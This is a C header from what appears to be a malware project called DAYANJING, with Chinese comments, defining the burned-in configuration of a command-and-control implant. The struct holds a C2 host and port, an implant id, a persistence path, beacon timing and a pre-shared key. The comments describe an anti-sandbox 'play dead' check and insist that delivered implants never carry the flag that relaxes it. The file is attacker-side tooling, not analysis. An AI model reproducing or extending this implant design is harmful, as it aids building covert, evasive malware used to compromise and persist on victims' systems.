/* DAYANJING v4 — monolith/include/mono_embed.h
 *
 * 构建期烧录配置的段布局。
 *
 * 这份头文件被两处 include，且必须共享同一份定义：
 *   - monolith/src/main.c     定义 g_embed（落在 .mono_cfg 段）并读取
 *   - monolith/tools/embedcfg.c  生成待烧录的 cfg.bin
 * 若两边各写一份结构，字段一旦漂移，烧录值与读取值会错位而**不报错** ——
 * 表现为"连不上 C2"或"写到错误路径"，极难定位。故强制共用。
 */

#ifndef MONO_EMBED_H
#define MONO_EMBED_H

#include <stdint.h>

#define MONO_EMBED_MAGIC 0x314f4e4du   /* "MON1" */
#define MONO_EMBED_VER   1u

/* flags 位：构建期决定，运行时不可改 —— 这是有意的设计。
   ALLOW_SANDBOX 放宽"命中沙箱即装死"的自检，仅供端到端验证使用。
   真实投送的制品**不得**置该位：植入体在沙箱里静默退出是对抗行为，
   若制品自带放宽开关，等于把免检权交到制品手里。 */
#define MONO_EMBED_FLAG_ALLOW_SANDBOX 0x0001u

typedef struct {
    uint32_t magic;
    uint16_t ver;
    uint16_t flags;
    char     host[256];
    char     id[64];
    char     persist_root[256];
    uint16_t port;
    uint16_t rsv0;
    uint32_t run_ms;
    uint32_t period_ms;
    uint32_t budget_bpm;
    uint8_t  psk[32];
    uint8_t  psk_len;
    uint8_t  pad[31];
} mono_embed_t;

#endif
